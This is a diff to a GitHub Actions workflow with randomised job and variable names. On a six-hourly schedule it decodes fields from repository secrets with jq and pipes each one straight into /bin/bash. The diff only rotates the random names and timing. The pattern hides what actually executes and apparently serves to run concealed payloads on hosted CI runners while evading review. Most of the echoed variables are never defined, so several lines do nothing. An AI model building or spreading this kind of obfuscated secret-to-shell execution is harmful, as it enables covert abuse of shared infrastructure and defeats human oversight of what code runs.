@@ -3,28 +3,23 @@ name: mingyulu1837
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 1/6 * * *'
+    - cron: '37 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          rch3531: ${{ secrets.rch3531 }}
+          kpp39: ${{ secrets.kpp39 }}
         run: |
-          echo $rch3531 | jq -r .msxlk590 | /bin/bash
-          echo $mlr5740 | jq -r .zb2437 | /bin/bash
-          echo $yxke80946 | jq -r .wahyx646 | /bin/bash
-          echo $qoq228 | jq -r .y0360 | /bin/bash
-          echo $fbae51 | jq -r .jyjf0 | /bin/bash
-          echo $qfi767 | jq -r .qbp4 | /bin/bash
-          echo $zc21229 | jq -r .qz0590 | /bin/bash
-          echo $tzxhr90008 | jq -r .gfbt237 | /bin/bash
-          echo $swvqu7589 | jq -r .f88 | /bin/bash
-          echo $cgodr71226 | jq -r .jja735 | /bin/bash
-          echo $oo05 | jq -r .jf41413 | /bin/bash
-          echo $az8 | jq -r .awrc3 | /bin/bash
-          echo $mfpo791 | jq -r .czluj8277 | /bin/bash
+          echo $kpp39 | jq -r .v24389 | /bin/bash
+          echo $itpg60 | jq -r .rw63141 | /bin/bash
+          echo $b81 | jq -r .o6 | /bin/bash
+          echo $hl92 | jq -r .qia4 | /bin/bash
+          echo $qa36 | jq -r .wjak99 | /bin/bash
+          echo $s00 | jq -r .osn80 | /bin/bash
+          echo $cqdx579 | jq -r .tuzsk0 | /bin/bash
+          echo $jab0934 | jq -r .enx5 | /bin/bash
 
